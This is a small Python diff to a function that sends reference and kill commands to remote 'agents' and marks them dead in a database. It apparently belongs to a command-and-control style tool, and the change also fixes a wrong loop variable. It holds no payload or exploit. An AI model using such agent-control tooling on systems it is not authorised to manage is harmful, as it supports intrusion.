@@ -4,8 +4,14 @@ from termcolor import colored
 def sendRefCMD(tsObj, destGroup, endpoint, refId):
     #send manual ping, expect resync back from agent
     #send refid kill, agent will clean up, status dead in db
+    kill = False
+    if refId == "KILL":
+        kill = True
+
     if destGroup == "agent":
-        tsObj.getDBObj().deadStatus(endpoint)
+        if kill:
+            tsObj.getDBObj().deadStatus(endpoint)
+
         print(colored(f" Sending Reference \"{refId}\" ==> ({endpoint})\n", "magenta"))
 
         iPacket = packets.IDPacket(endpoint, refId)
@@ -17,7 +23,9 @@ def sendRefCMD(tsObj, destGroup, endpoint, refId):
             return 
 
         for entry in data:
-            tsObj.getDBObj().deadStatus(entry[0])
+            if kill:
+                tsObj.getDBObj().deadStatus(entry[0])
+
             print(colored(f" Sending Reference \"{refId}\" ==> ({entry[0]})\n", "magenta"))
             iPacket = packets.IDPacket(entry[0], refId)
             iPacket.sendIdPacket()
@@ -25,7 +33,9 @@ def sendRefCMD(tsObj, destGroup, endpoint, refId):
     else:
         data = tsObj.getDBObj().pullSpecific(destGroup, endpoint)
         for ip in data:
-            tsObj.getDBObj().deadStatus(entry[0])
+            if kill:
+                tsObj.getDBObj().deadStatus(ip[0])
+
             print(colored(f" Sending Reference \"{refId}\" ==> {ip[0]} ({endpoint})\n", "magenta"))
 
             iPacket = packets.IDPacket(ip[0], refId)
